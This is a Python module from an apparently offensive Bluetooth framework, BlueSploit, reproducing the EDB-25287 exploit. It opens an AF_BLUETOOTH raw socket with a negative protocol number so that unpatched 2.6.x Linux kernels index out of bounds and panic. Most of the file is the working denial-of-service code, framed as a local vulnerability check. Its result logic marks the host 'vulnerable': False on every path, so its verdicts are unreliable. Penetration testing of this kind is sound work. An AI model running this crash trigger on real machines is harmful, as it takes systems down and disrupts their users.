"""
BlueSploit Module: Linux Kernel HCI Signed Proto DoS
EDB-ID: 25287  (BID 12911)

Local kernel DoS — opens an AF_BLUETOOTH/SOCK_RAW socket with a
negative protocol number (-1111). On unpatched kernels the signed
value bypasses the proto bounds check and indexes proto_table[]
with a negative integer → kernel oops / panic.

Targets the LOCAL host. Useful as a vulnerability check.
"""

import socket
from core.base import (
    DosModule, ModuleInfo, ModuleOption,
    BTProtocol, Severity,
)
from core.utils.printer import (
    print_success, print_error, print_info, print_warning, Colors,
)


AF_BLUETOOTH = 31
NEG_PROTO    = -1111


class Module(DosModule):
    """
    Linux Kernel signed-proto integer DoS

    Reproduces the EDB-25287 PoC. Affects 2.6.x kernels prior to mid-2005.
    """

    info = ModuleInfo(
        name="dos/linux_hci_signed_proto",
        description="Linux kernel AF_BLUETOOTH signed proto DoS (EDB-25287)",
        author=["Original PoC: anonymous (BID 12911)"],
        protocol=BTProtocol.CLASSIC,
        severity=Severity.LOW,
        references=[
            "https://www.exploit-db.com/exploits/25287",
            "https://www.securityfocus.com/bid/12911",
        ],
    )

    def _setup_options(self) -> None:
        self.options = {
            "proto": ModuleOption(
                name="proto", required=False, default=NEG_PROTO,
                description="Negative protocol number to pass to socket()",
            ),
        }

    def run(self) -> bool:
        proto = int(self.get_option("proto"))
        C = Colors
        print(f"\n  {C.RED}╔{'═'*55}╗{C.RESET}")
        print(f"  {C.RED}║{C.RESET}  {C.BOLD}Linux HCI Signed Proto DoS (EDB-25287){C.RESET}        {C.RED}║{C.RESET}")
        print(f"  {C.RED}╚{'═'*55}╝{C.RESET}\n")
        print_warning("Targets the LOCAL host kernel — may panic the system")
        print_info(f"socket(AF_BLUETOOTH={AF_BLUETOOTH}, SOCK_RAW, {proto})")

        try:
            s = socket.socket(AF_BLUETOOTH, socket.SOCK_RAW, proto)
            s.close()
            print_success("Socket call returned without panic — kernel patched")
            self.add_result({"edb_id": 25287, "vulnerable": False, "proto": proto})
            return True
        except OSError as e:
            # On patched kernels this returns EINVAL/EPROTONOSUPPORT cleanly.
            print_info(f"socket() rejected: {e}")
            self.add_result({"edb_id": 25287, "vulnerable": False,
                             "proto": proto, "errno": e.errno})
            return True
        except Exception as e:
            print_error(f"Error: {e}")
            return False
